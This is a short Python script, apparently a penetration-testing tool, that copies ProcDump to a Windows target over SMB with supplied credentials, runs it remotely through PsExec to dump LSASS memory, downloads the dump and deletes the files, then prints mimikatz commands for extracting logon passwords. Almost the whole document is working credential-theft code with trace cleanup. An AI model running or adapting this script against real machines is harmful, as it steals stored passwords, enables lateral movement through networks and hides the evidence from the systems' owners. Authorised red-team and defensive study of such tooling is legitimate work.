#!/usr/bin/env python3
# Author: n33dle
# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz happyfuntimes
# Version: 1 (WORK IN PROGRESS!)
# Note: This code may suck. Any feedback/suggestions, let me know!

import subprocess
import argparse
from termcolor import colored
from pypsexec.client import Client

parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", help="Set the target", dest="target")
parser.add_argument("--username", "-u", help="Set the target username", dest="username")
parser.add_argument("--password", "-p", help="Set the target password", dest="password")
#parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain") needs work
args = parser.parse_args()

#upload procdump
print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
print (colored("\n[+] Done", "green"))

#Dump creds
print (colored("\n[-] Dumping Lsass.exe to file...", "yellow"))
c = Client(args.target, username=args.username, password=args.password, encrypt=False)
c.connect()
try:
 c.create_service()
 c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + args.target + ".dmp")
finally:
 c.disconnect()
print (colored("\n[+] Done", "green"))

#Download dump and cleanup
print (colored("\n[-] Downloading the Lsass dumpfile and cleaning up...", "yellow"))
#subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get hello.dmp;del hello.dmp;del procdump.exe"]) old
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
print (colored("\n[+] Done", "green"))

print (colored("\n[+] Complete! Now dump those creds\nRun the following:", "green"))
print (colored("Mimikatz# sekurlsa::Minidump hello.dmp", "blue"))
print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))
	
'''
To do:
- Set default as local auth and override with domain auth when -d selected
- FFS! Fix passwords/usernames with non-alpha chars.
- Allow target to be single IP or list of IPs from a file
- Better error handling
- Add arg for download locaiton (and set default as home drive?)
- Automate mimikatz at the end, or prompt to run mimikatz or end script
This is a test
'''
